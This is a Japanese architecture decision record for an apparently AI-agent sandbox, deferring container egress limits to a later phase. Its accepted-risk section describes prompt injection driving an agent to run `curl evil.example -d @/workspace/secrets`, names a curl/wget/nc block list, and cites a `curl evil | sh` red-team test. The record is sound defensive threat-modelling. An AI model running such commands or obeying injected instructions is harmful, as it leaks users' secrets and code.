# ADR 0006: Phase 1 はコンテナ egress 制限なし (Phase 2 で allowlist 化)

- **Date**: 2026-04-15
- **Status**: Accepted (Phase 1 only, Phase 2 で見直し必須)
- **Phase**: 1

## Context

sandbox container から外部への通信について、セキュリティ上は egress allowlist が望ましい
(api.anthropic.com, registry.npmjs.org, GitHub 等に限定) が、PoC 段階では「どの通信が
必要になるか」を網羅しきれない。実装工数・ユースケース検証のバランスを取りたい。

## Decision

**Phase 1 では container egress は無制限**。Phase 2 移行時に allowlist proxy (squid, Envoy) を導入。

- container network は Docker default bridge
- Anthropic API, GitHub, npm registry, その他すべて通る
- Runner は container 内の通信ログは取らない (Phase 1 範囲)
- `WebFetch` / `WebSearch` ツールは profile で **default off** のまま。Agent が任意のサイトを
  fetch する経路は依然として profile レイヤで抑制される

## Consequences

### Accepted Risk (Phase 1)
- data exfiltration: 万一 prompt injection で `curl evil.example -d @/workspace/secrets`
  のような Bash 実行に至った場合、外部に流出する
- ただし Bash allowlist で curl/wget/nc は block されるので、通常は発生しない
- 補助: secret-redactor で credentials mount 由来の漏洩を検出 (post-hoc)

### Phase 2 で実装必須
- allowlist proxy (例: tinyproxy + ACL, squid + url_regex)
- container の `--dns` を proxy に向ける
- Anthropic API / npm / PyPI / GitHub / Langfuse 自ホストのみ許可
- 試験: レッドチーム test 1 (`curl evil | sh`) が network レイヤで止まることを確認

## References

- THREAT-MODEL.md の Information Disclosure I3
- ユーザー判断 (2026-04-15): PoC 段階で egress 制限なし
